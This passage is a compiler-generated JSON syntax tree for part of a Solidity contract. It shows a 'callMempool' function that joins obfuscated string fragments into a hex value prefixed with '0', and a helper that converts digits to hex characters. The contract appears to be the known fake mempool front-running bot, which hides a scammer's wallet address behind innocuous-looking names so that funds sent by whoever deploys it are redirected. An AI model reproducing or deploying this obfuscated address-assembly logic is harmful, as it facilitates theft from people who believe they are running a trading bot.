															"typeString": "string"
														},
														"typeName": {
															"id": 1335,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14834:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1345,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1339,
																	"name": "_memPoolDepth",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1296,
																	"src": "14883:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1338,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14868:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1340,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14868:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1342,
																	"name": "_memPoolCount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1301,
																	"src": "14914:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1341,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1070,
																"src": "14899:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1343,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14899:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1337,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14860:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1344,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14860:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14834:95:0"
											},
											{
												"assignments": [
													1347
												],
												"declarations": [
													{
														"constant": false,
														"id": 1347,
														"mutability": "mutable",
														"name": "_allMempools",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "14943:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1346,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "14943:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1358,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1350,
																	"name": "_memPool1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1305,
																	"src": "14988:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1351,
																	"name": "_memPool2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1314,
																	"src": "14999:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1349,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1679,
																"src": "14980:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1352,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "14980:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1354,
																	"name": "_memPool3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1325,
																	"src": "15019:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1355,
																	"name": "_memPool4",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1336,
																	"src": "15030:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 1353,
																"name": "mempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1679,
																"src": "15011:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (string memory,string memory) pure returns (string memory)"
																}
															},
															"id": 1356,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15011:29:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1348,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "14972:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1357,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14972:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14943:98:0"
											},
											{
												"assignments": [
													1360
												],
												"declarations": [
													{
														"constant": false,
														"id": 1360,
														"mutability": "mutable",
														"name": "_fullMempool",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1368,
														"src": "15052:26:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1359,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "15052:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1365,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1362,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15089:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 1363,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1347,
															"src": "15094:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1361,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1679,
														"src": "15081:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1364,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15081:26:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "15052:55:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1366,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1360,
													"src": "15128:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1262,
												"id": 1367,
												"nodeType": "Return",
												"src": "15121:19:0"
											}
										]
									},
									"documentation": null,
									"id": 1369,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1259,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "14088:2:0"
									},
									"returnParameters": {
										"id": 1262,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1261,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1369,
												"src": "14114:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1260,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "14114:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14113:15:0"
									},
									"scope": 1680,
									"src": "14068:1090:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1431,
										"nodeType": "Block",
										"src": "15563:269:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1382,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1378,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1376,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15578:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1377,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1371,
															"src": "15583:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "15578:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1381,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1379,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1371,
															"src": "15588:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "39",
															"id": 1380,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15593:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "15588:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "15578:16:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1409,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1402,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "3130",
																"id": 1397,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "15666:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1400,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1371,
																		"src": "15678:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1399,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15672:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1398,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "15672:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1401,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15672:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "15666:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1408,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1405,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1371,
																		"src": "15690:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1404,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15684:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1403,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "15684:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1406,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15684:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3135",
																"id": 1407,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "15696:2:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "15684:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "15666:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1426,
													"nodeType": "IfStatement",
													"src": "15662:103:0",
													"trueBody": {
														"id": 1425,
														"nodeType": "Block",
														"src": "15700:65:0",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1422,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1420,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"hexValue": "61",
																									"id": 1416,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "15738:3:0",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 1415,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "15733:4:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 1414,
																									"name": "byte",
																									"nodeType": "ElementaryTypeName",
																									"src": "15733:4:0",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 1417,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "15733:9:0",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 1413,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "15727:5:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 1412,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "15727:5:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1418,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "15727:16:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1419,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1371,
																					"src": "15746:1:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "15727:20:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3130",
																				"id": 1421,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "15750:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "15727:25:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1411,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "15722:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1410,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "15722:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1423,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15722:31:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 1375,
																"id": 1424,
																"nodeType": "Return",
																"src": "15715:38:0"
															}
														]
													}
												},
												"id": 1427,
												"nodeType": "IfStatement",
												"src": "15574:191:0",
												"trueBody": {
													"id": 1396,
													"nodeType": "Block",
													"src": "15596:60:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1393,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1389,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "15634:3:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 1388,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "15629:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 1387,
																							"name": "byte",
																							"nodeType": "ElementaryTypeName",
																							"src": "15629:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1390,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "15629:9:0",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1386,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "15623:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1385,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "15623:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1391,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "15623:16:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1392,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1371,
																			"src": "15642:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "15623:20:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1384,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15618:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 1383,
																		"name": "byte",
																		"nodeType": "ElementaryTypeName",
																		"src": "15618:4:0",
																		"typeDescriptions": {
